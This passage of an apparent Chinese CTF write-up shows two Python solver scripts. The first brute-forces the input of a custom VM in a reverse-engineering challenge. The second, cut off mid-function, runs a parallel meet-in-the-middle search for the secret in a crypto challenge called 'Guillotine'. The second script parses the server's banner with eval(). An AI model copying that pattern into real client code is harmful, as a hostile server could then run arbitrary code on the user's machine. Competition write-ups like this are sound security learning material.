class="keyword">not</span> ok:</span><br><span class="line">    </span><br><span class="line">      <span class="built_in">print</span>(<span class="string">f&quot;!! 在 pos=<span class="subst">&#123;pos&#125;</span> 未找到匹配字节，停止。&quot;</span>)</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">  elapsed = time.time() - start_time</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&quot;[+] 求解完成，耗时 <span class="subst">&#123;elapsed:<span class="number">.1</span>f&#125;</span>s&quot;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">bytes</span>(found)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证函数：把恢复到的 50 字节放回 VM，看返回</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">flag_bytes: <span class="built_in">bytes</span></span>):</span><br><span class="line"></span><br><span class="line">  vm = VM(code=CODE, cmp_data=CMP_DATA, mem=flag_bytes)</span><br><span class="line"></span><br><span class="line">  res = vm.run() <span class="keyword">if</span> <span class="built_in">hasattr</span>(vm, <span class="string">&quot;run&quot;</span>) <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># our VM class doesn&#x27;t have run wrapper; simulate here</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Re-run until halt</span></span><br><span class="line"></span><br><span class="line">  vm2 = VM(code=CODE, cmp_data=CMP_DATA, mem=flag_bytes)</span><br><span class="line"></span><br><span class="line">  steps = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    halted, msg = vm2.step()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> halted:</span><br><span class="line">    </span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;[*] VM final message:&quot;</span>, msg)</span><br><span class="line">    </span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;[*] Final state: acc=&#123;&#125;, idx=&#123;&#125;, byte2=&#123;&#125;, sp=&#123;&#125;, pc=&#123;&#125;, reg3=&#123;&#125;, counter=&#123;&#125;, errflag=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">    </span><br><span class="line">        vm2.acc, vm2.idx, <span class="built_in">getattr</span>(vm2, <span class="string">&quot;byte2&quot;</span>, <span class="number">0</span>), vm2.sp, vm2.pc, vm2.reg3, vm2.counter, vm2.errflag</span><br><span class="line">    </span><br><span class="line">      ))</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    steps += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> steps &gt; <span class="number">2000000</span>:</span><br><span class="line">    </span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;[!] VM run exceeded step limit&quot;</span>)</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主流程</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;开始自动求解 VM 输入（50 字节）...&quot;</span>)</span><br><span class="line"></span><br><span class="line">  flag_bytes = find_flag()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> flag_bytes <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;求解失败。&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;\n[+] 恢复到的原始输入（raw bytes）：&quot;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(flag_bytes)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 尝试以可打印形式显示（若包含不可打印字符会以 repr 显示）</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">    s = flag_bytes.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 以 utf-8 解码：&quot;</span>, s)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 以 utf-8 解码失败，显示 repr：&quot;</span>, <span class="built_in">repr</span>(flag_bytes))</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;\n[*] 用 VM 验证该输入：&quot;</span>)</span><br><span class="line"></span><br><span class="line">  verify(flag_bytes)</span><br></pre></td></tr></table></figure>



<p><img src="/2025/08/23/JGCTF-8-WP/image17.png"></p>
<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Guillotine"><a href="#Guillotine" class="headerlink" title="Guillotine"></a>Guillotine</h2><p>这个本地直接就通了</p>
<p>但是打服务器老是超时</p>
<p>最终靠GPT5成功优化哈哈哈哈哈哈</p>
<p>直接丢脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># parallel_find_secret.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Event, Queue, cpu_count</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------- 配置（按需修改）-------------</span></span><br><span class="line"></span><br><span class="line">P = <span class="number">257</span></span><br><span class="line"></span><br><span class="line">N = <span class="number">36</span></span><br><span class="line"></span><br><span class="line">M = <span class="number">50</span></span><br><span class="line"></span><br><span class="line">LEFT_BITS = <span class="number">18</span></span><br><span class="line"></span><br><span class="line">RIGHT_BITS = <span class="number">18</span></span><br><span class="line"></span><br><span class="line">LEFT_SIZE = <span class="number">1</span> &lt;&lt; LEFT_BITS</span><br><span class="line"></span><br><span class="line">RIGHT_SIZE = <span class="number">1</span> &lt;&lt; RIGHT_BITS</span><br><span class="line"></span><br><span class="line">TIME_INDICES = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>]  <span class="comment"># 使用哪些 time 行（保持与服务器一致）</span></span><br><span class="line"></span><br><span class="line">RADIUS = <span class="number">3</span>         <span class="comment"># near 容差 ±3</span></span><br><span class="line"></span><br><span class="line">K_CHECK = <span class="number">6</span>         <span class="comment"># 先用前 K_CHECK 个 time 做快速校验（0 表示禁用快速校验）</span></span><br><span class="line"></span><br><span class="line">SEED = <span class="number">1337</span>         <span class="comment"># 生成 A 的随机种子（必须跟服务器一致）</span></span><br><span class="line"></span><br><span class="line">PROCESSES = <span class="built_in">max</span>(<span class="number">1</span>, cpu_count() - <span class="number">0</span>) <span class="comment"># 启动进程数（可改为具体数字）</span></span><br><span class="line"></span><br><span class="line">PRINT_PROGRESS_EVERY = <span class="number">65536</span>     <span class="comment"># 每多少 r 打印一次进度（单进程内）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_B_list_from_banner</span>(<span class="params">banner_str</span>):</span><br><span class="line"></span><br><span class="line">  m = re.search(<span class="string">r&#x27;give you B: (\[.*?\])&#x27;</span>, banner_str, re.S)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> m:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">    B_list = <span class="built_in">eval</span>(m.group(<span class="number">1</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> B_list</span><br><span class="line"></span><br><span class="line">  <span class="keyword">except</span> Exception:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_problem_from_B</span>(<span class="params">B_list, seed=SEED</span>):</span><br><span class="line"></span><br><span class="line">  random.seed(seed)</span><br><span class="line"></span><br><span class="line">  A = [[[random.randrange(P) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(N)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(M)]</span><br><span class="line"></span><br><span class="line">  C = [<span class="number">0</span>] * M</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(M):</span><br><span class="line"></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    </span><br><span class="line">      s = (s + A[t][j][<span class="number">0</span>]) % P</span><br><span class="line">    </span><br><span class="line">    C[t] = s</span><br><span class="line"></span><br><span class="line">  U = [<span class="number">0</span>] * M</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(M):</span><br><span class="line"></span><br><span class="line">    U[t] = (B_list[t] - C[t]) % P</span><br><span class="line"></span><br><span class="line">  D = [[<span class="number">0</span>] * N <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(M)]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(M):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    </span><br><span class="line">      D[t][j] = (A[t][j][<span class="number">1</span>] - A[t][j][<span class="number">0</span>]) % P</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> A, C, U, D</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">left_map_build</span>(<span class="params">D, time_indices</span>):</span><br><span class="line"></span><br><span class="line">  base = P</span><br><span class="line"></span><br><span class="line">  mapping = defaultdict(<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">  D_subs = []</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> t <span class="keyword">in</span> time_indices:</span><br><span class="line"></span><br><span class="line">    D_subs.append([D[t][j] % P <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(LEFT_BITS)])</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(LEFT_SIZE):</span><br><span class="line"></span><br><span class="line">    key_val = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    mul = <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(time_indices)):</span><br><span class="line">    </span><br><span class="line">      Dj = D_subs[idx]</span><br><span class="line">    </span><br><span class="line">      S_val = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">      ll = l</span><br><span class="line">    </span><br><span class="line">      <span class="comment"># 只遍历 1 位以加速</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">while</span> ll:</span><br><span class="line">    </span><br><span class="line">        lowbit = ll &amp; -ll</span><br><span class="line">    </span><br><span class="line">        bit_index = (lowbit.bit_length() - <span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">        S_val += Dj[bit_index]</span><br><span class="line">    </span><br><span class="line">        ll ^= lowbit</span><br><span class="line">    </span><br><span class="line">      S_val %= base</span><br><span class="line">    </span><br><span class="line">      key_val += S_val * mul</span><br><span class="line">    </span><br><span class="line">      mul *= base</span><br><span class="line">    </span><br><span class="line">    mapping[key_val].append(l)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> mapping</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">precompute_Sr_table</span>(<span class="params">D, time_indices</span>):</span><br><span class="line"></span><br><span class="line">  R = RIGHT_SIZE</span><br><span class="line"></span><br><span class="line">  k = <span class="built_in">len</span>(time_indices)</span><br><span class="line"></span><br><span class="line">  Sr_table = [ [<span class="number">0</span>]*R <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(k) ]</span><br><span class="line"></span><br><span class="line">  D_subs = []</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> t <span class="keyword">in</span> time_indices:</span><br><span class="line"></span><br><span class="line">    D_subs.append([D[t][j + LEFT_BITS] % P <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(RIGHT_BITS)])</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, R):</span><br><span class="line"></span><br><span class="line">    lowbit = r &amp; -r</span><br><span class="line">    </span><br><span class="line">    bit_idx = lowbit.bit_length() - <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    prev = r &amp; (r - <span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">    </span><br><span class="line">      Sr_table[idx][r] = (Sr_table[idx][prev] + D_subs[idx][bit_idx]) % P</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> Sr_table</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">near_values</span>(<span class="params">v, p=P, radius=RADIUS</span>):</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> [ (v + d) % p <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(-radius, radius+<span class="number">1</span>) ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quick_check_candidate</span>(<span class="params">s, A, B_list, check_times, p=P</span>):</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> t <span class="keyword">in</span> check_times:</span><br><span class="line"></span><br><span class="line">    expected_b = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    row = A[t]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    </span><br><span class="line">      bit = (s &gt;&gt; j) &amp; <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      expected_b += row[j][bit]</span><br><span class="line">    </span><br><span class="line">    expected_b %= p</span><br><span class="line">    </span><br><span class="line">    err = (B_list[t] - expected_b) % p</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> err &gt; RADIUS <span class="keyword">and</span> err &lt; p - RADIUS:</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">full_check_candidate</span>(<span class="params">s, A, B_list, p=P</span>):</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(M):</span><br><span class="line"></span><br><span class="line">    expected_b = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    row = A[t]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    </span><br><span class="line">      bit = (s &gt;&gt; j) &amp; <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      expected_b += row[j][bit]</span><br><span class="line">    </span><br><span class="line">    expected_b %= p</span><br><span class="line">    </span><br><span class="line">    err = (B_list[t] - expected_b) % p</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> err &gt; RADIUS <span class="keyword">and</span> err &lt; p - RADIUS:</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">worker_proc</span>(<span class="params">proc_id, r_start, r_end, B_list, A, U, D, time_indices, result_queue, stop_event</span>):</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  每个进程单独构建 left_map 和 Sr_table，然后在 [r_start, r_end) 区间内枚举。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  发现解将把结果放入 result_queue 并 set stop_event。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">    t0 = time.time()</span><br><span class="line">    </span><br><span class="line">    left_map = left_map_build(D, time_indices)</span><br><span class="line">    </span><br><span class="line">    t1 = time.time()</span><br><span class="line">    </span><br><span class="line">    Sr_table = precompute_Sr_table(D, time_indices)</span><br><span class="line">    </span><br><span class="line">    t2 = time.time()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 